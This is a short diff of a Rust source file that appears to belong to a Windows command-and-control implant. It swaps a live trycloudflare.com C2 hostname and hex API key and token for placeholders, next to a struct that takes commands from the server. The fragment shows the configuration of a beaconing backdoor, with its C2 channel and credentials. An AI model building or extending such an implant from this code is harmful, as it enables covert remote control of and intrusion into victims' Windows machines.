@@ -10,9 +10,9 @@ use std::os::windows::process::CommandExt;
 use rand::Rng;
 use serde::{Deserialize, Serialize};
 
-fn get_c2() -> String { "geometry-offered-guns-replies.trycloudflare.com".to_string() }
-fn get_api() -> String { "051dfe1cf5e570846315512a11396f7d".to_string() }
-fn get_tok() -> String { "8ca60eebbe9a141869305ed9ab1a0050".to_string() }
+fn get_c2() -> String { "CHANGE-ME.trycloudflare.com".to_string() }
+fn get_api() -> String { "00000000000000000000000000000000".to_string() }
+fn get_tok() -> String { "00000000000000000000000000000000".to_string() }
 
 #[derive(Deserialize)]
 struct CmdResponse { command: Option<String> }
